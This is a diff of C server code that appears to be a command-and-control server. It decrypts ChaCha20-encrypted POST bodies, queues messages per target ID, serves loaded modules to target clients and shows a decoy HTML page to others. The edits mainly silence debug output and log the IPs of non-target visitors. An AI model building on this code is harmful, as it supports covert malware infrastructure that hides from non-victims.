@@ -232,7 +232,6 @@ void enqueue(const char* targetId, const char* msg) {
 
 // --- Dequeue message ---
 char* dequeue(const char* targetId) {
-    printf("entered\n");
     Queue* q = getQueue(targetId);
     if (!q->head) {
         return NULL; // No messages
@@ -245,7 +244,6 @@ char* dequeue(const char* targetId) {
     char* msg = strdup(node->message);
     free(node);
     return msg;
-    printf("exited\n");
 }
 
 unsigned char *load_module(char *module, int *size){
@@ -520,15 +518,15 @@ void* handle_http_connections(void* arg)
             //printf("POST body:\n%s\n", buffer + headers_end);  // Body starts here
             body_buffer = buffer + headers_end;
             chacha20_Full(body_buffer, body_buffer, content_length);
-            printf("POST body:\n%s\n", buffer + headers_end);  // Body starts here
+            //printf("POST body:\n%s\n", buffer + headers_end);  // Body starts here
 
-            for (int i = 0; i < 100; i++) {
-                printf("%02X ", body_buffer[i]& 0xFF);  // %02X → two-digit uppercase hex
-                if ((i + 1) % 16 == 0) printf("\n"); // newline every 16 bytes
-            }
+            // for (int i = 0; i < 100; i++) {
+            //     printf("%02X ", body_buffer[i]& 0xFF);  // %02X → two-digit uppercase hex
+            //     if ((i + 1) % 16 == 0) printf("\n"); // newline every 16 bytes
+            // }
         } else {
             buffer[total_received] = '\0';
-            printf("Full request (no body):\n%s\n", buffer);
+            //printf("Full request (no body):\n%s\n", buffer);
         }
 
         if (total_received > 0) {
@@ -588,7 +586,7 @@ void* handle_http_connections(void* arg)
                         response = load_module(reply, &response_size);
                         
                         if (response) {
-                            printf("%s", response);
+                            //printf("%s", response);
                             send(client_socket, response, response_size, 0);
                             free(response);
                         } else {
@@ -609,7 +607,9 @@ void* handle_http_connections(void* arg)
                 }
             } else {
                 // Non-target client - send normal response
-                printf("[+] Normal client detected\n");
+
+                // print client IP
+                printf("[+] Non-target client connected: %s\n", inet_ntoa(client_addr.sin_addr));
                 const char* response = 
                     "HTTP/1.1 200 OK\r\n"
                     "Content-Type: text/html\r\n"
